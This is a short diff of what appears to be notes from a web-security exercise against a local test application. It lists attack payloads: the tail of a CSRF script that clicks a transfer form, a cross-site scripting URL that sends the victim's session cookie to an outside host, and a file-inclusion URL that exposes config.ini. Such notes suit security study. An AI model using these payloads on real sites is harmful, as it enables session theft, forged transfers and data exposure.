@@ -32,5 +32,5 @@ document.getElementById(\'transferForm\').elements[3].click();</script>
 ## Session Hijack 
 `http://localhost:8080/secret.php?name=Stef%3Cscript%3Edocument.location=%27http://somewhere.com/stef/kek-session.php?%27%2Bdocument.cookie;%3C/script%3E`
 
-## arbitrairy file exposure 
+## arbitrairy file exposure / execution
 `http://localhost:8080/secret.php?page=config.ini&account=NL15RABO037592641`
